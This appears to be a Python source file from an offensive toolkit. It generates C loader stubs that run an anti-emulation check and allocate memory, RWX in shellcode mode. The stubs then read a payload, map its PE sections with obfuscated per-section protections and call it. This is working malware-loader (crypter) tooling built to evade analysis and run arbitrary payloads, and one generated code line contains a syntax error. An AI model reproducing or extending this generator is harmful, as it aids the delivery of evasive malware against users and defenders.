import pefile, random, os, sys
from enum import Flag

from c2.evp.prot_logic import SecProtLogic
from c2.evp.prot_logic_gen import SecProtLogicGen
from c2.evp.prot_logic_checker import ProtLogicChecker
from c2.evp.page_prot import PageProt
from c2.evp.sec_mem_chars import SecMemChars
from c2.evp.prot_checks import check_prot_match_secchars
from c2.stub_tools.construct import ALLOCs
from c2.infra.tool_cli import ToolCLI
from c2.infra.cli_seed import CLISeed, DEFAULT_SEED_SIZE, textualize_seed
from c2.infra.seed_get_or_generate import seed_get_or_generate
from c2.infra.unischema import unischema_load


_sd = os.path.dirname(__file__)
_inclroot = f'{_sd}/..'

class EVPGenCLI(ToolCLI):
  def _initialize(self):
    self._progname = os.path.basename(__file__)

  def _setup_args(self):
    self.__cli_seed = CLISeed(os.getcwd(), DEFAULT_SEED_SIZE)
    self._add_arg_processor(self.__cli_seed)

    self._agr.add_config('opts', unischema_load(f'{_sd}/evp_opts.UNISCHEMA', _inclroot))

    parser = self._parser
    parser.add_argument('-t', '--template', required=True)
    parser.add_argument('-o', '--out_file', required=False) #otherwise, print result
    #parser.add_argument('--alloc', required=True, choices=ALLOCs)
    parser.add_argument('--bin_type', required=True, help='assert if wrong')
    parser.add_argument('--pe', required=False)
    parser.add_argument('--no_spread_section_load', action='store_true', help='has no effect if have no --pe')
    parser.add_argument('-v', '--verbose', action='store_true')

  def _do_work(self):
    args = self._args

    seed = seed_get_or_generate(self.__cli_seed, DEFAULT_SEED_SIZE)
    print(f'EVPGenCLI._do_work using seed {textualize_seed(seed)}')
    self.__rng = random.Random(seed)
    print(f'<evpgen.py rng probe: {self.__rng.randint(0, sys.maxsize)}>')

    if args.verbose:
      print('===Verbose: evpgen opts:===')
      print(self._agr.config('opts'))
      print()

    if args.pe:
      if args.bin_type == 'win_shellcode':
        raise RuntimeError('--pe is not for shellcode mode, it\'s only for reading the section info for EXE/DLL')
      self.__pe = pefile.PE(args.pe, fast_load=True)
      self.__check_bin_type()

    if args.pe:
      if args.no_spread_section_load:
        raise RuntimeError('--no_spread_section_load eliminates the use of --pe')

    self._usercodes = []
    usercodes = self._usercodes
    self.__add_usercodes()

    templ = open(args.template, 'r').read()
    output = templ.replace('%%%USERCODE_DEFS%%%', '\n'.join([f'#define USERCODE{n+1}() {usercodes[n]}' for n in range(len(usercodes))]))
    output = output.replace('%%%USERCODE_LINES%%%', self.__make_call_lines())

    if args.out_file:
      open(args.out_file, 'w').write(output)
    else:
      print(output)


  def __add_usercodes(self):
    args = self._args
    usercodes = self._usercodes
    
    self.__add_startup_usercodes()

    if args.bin_type == 'win_shellcode':
      ### SHELLCODE 
      usercodes.append(f'{{ CHILD_A1D = ObfDw(PAGE_EXECUTE_READWRITE);  _CALL(alloc);  CHILD_RETD = 1; }}')
      usercodes.append('{ _CALL(pay_read); CHILD_RETD = 1; }')
    else:
      if args.no_spread_section_load:
        assert(not args.pe)
        self.__add_exe_or_dll_usercodes_NOSPREAD()
      else:
        assert(args.pe)
        self.__add_exe_or_dll_usercodes()

    self.__add_final_usercodes()


  def __make_call_lines(self):
    lines = [
      '  USERCODE1();  XASSERT(CHILD_RETD == 1);',
      '  SLEEP_RELEASE_ONLY(SLEEPTIME0_MSEC);',
      '  USERCODE2();  XASSERT(CHILD_RETD == 1);',
      '  SLEEP_RELEASE_ONLY(SLEEPTIME1_MSEC);',
      '  USERCODE3();  XASSERT(CHILD_RETD == 1);',
    ]
    lines += [f'  USERCODE{n}();  XASSERT(CHILD_RETD == 1);' for n in range(4, len(self._usercodes)+1)]
    return '\n'.join(lines)


  def __add_startup_usercodes(self):
    usercodes = self._usercodes
    usercodes.append('{ _CALL(prepare); }')
    usercodes.append('{ _CALL(antiemu); }')
    usercodes.append('{ _CALL(locate); CHILD_RETD = 1; }')


  def __add_exe_or_dll_usercodes_NOSPREAD(self):
    args = self._args
    usercodes = self._usercodes

    init_pageprot = PageProt.PAGE_READWRITE

    usercodes.append(f'{{ CHILD_A1D = {init_pageprot.name};  _CALL(alloc);  CHILD_RETD = 1; }}')
    usercodes.append('{ _CALL(pay_read); CHILD_RETD = 1; }')
    usercodes.append('{ _CALL(pay_mz_setup); CHILD_RETD = 1; }')

    usercodes.append('{ for (int=0; i<Z(ldr_pNtHdrs)->FileHeader.NumberOfSections; i++) { CHILD_A1D = ObfEncDw(i); _CALL(ldr_prot_sec); } CHILD_RETD = 1; }')

    # Add extra
    usercodes.append('{ _CALL(pay_mz_setup_post); CHILD_RETD = 1; }') #shared


  def __add_exe_or_dll_usercodes(self):
    args = self._args
    usercodes = self._usercodes
    evp_opts = self._agr.config('opts')

    sec_names, sec_chars, =  self.__getsecinfo()
    self.__logic = SecProtLogic()
    self.__logicgen = SecProtLogicGen(self.__logic, sec_chars, evp_opts['protlogic'], self.__rng)
    self.__logicgen.prnfn = print # enable logging
    self.__logicgen.sec_names = sec_names
    self.__logicgen.generate()

    # Check logic for correcrness for this sec_chars before using it
    checker = ProtLogicChecker(sec_chars, self.__logic, evp_opts['protlogic'])
    checker.check(sec_names)

    init_pageprot = self.__logic.initial_pageprot

    usercodes.append(f'{{ CHILD_A1D = {init_pageprot.name};  _CALL(alloc);  CHILD_RETD = 1; }}')
    usercodes.append('{ _CALL(pay_read); CHILD_RETD = 1; }')
    usercodes.append('{ _CALL(pay_mz_setup); CHILD_RETD = 1; }')

    # Spread sec protect actions
    for nsec, dwSecProtect in self.__logic.secidx_pageprot_tups:
      secname = sec_names[nsec]
      usercodes.append(f'{{ CHILD_A1D = ObfEncDw({nsec}); CHILD_A2D = ObfEncDw({dwSecProtect.name}); _CALL(ldr_prot_sec_with); CHILD_RETD = 1; }}/* {secname.decode()} prot:{dwSecProtect.name}*/')

    # Add extra
    usercodes.append('{ _CALL(pay_mz_setup_post); CHILD_RETD = 1; }') #shared


  def __add_final_usercodes(self):
    usercodes = self._usercodes
    usercodes.append('{ __DBGPOINT__(); CHILD_RETD = 1; }')
    usercodes.append('{ _CALL(pay_call); CHILD_RETD = 1; }')


  def __check_bin_type(self):
    args = self._args
    pe = self.__pe
    is_dll_by_hdrs = (pe.FILE_HEADER.Characteristics & 0x2000) != 0  # IMAGE_FILE_DLL
    if args.bin_type == 'win_exe':
      assert(not is_dll_by_hdrs)
    elif args.bin_type == 'win_dll':
      assert(is_dll_by_hdrs)
    else:
      raise RuntimeError(f'unknown {args.bin_type=}')


  def __getsecinfo(self): # ->tup
    pe = self.__pe
    sec_names, sec_char = [], []
    for section in pe.sections:
      #section.Characteristics
      sec_names.append(section.Name.strip(b'\x00'))

      charac_int = section.Characteristics
      # clear unknown flag bits in integer value so SecMemChars accepts it
      charac_int &= SecMemChars.IMAGE_SCN_MEM_READ.value|\
                    SecMemChars.IMAGE_SCN_MEM_WRITE.value|\
                    SecMemChars.IMAGE_SCN_MEM_EXECUTE.value
      sec_char.append(SecMemChars(charac_int))

    return sec_names, sec_char



if __name__ == '__main__':
  EVPGenCLI(sys.argv[1:]).execute()


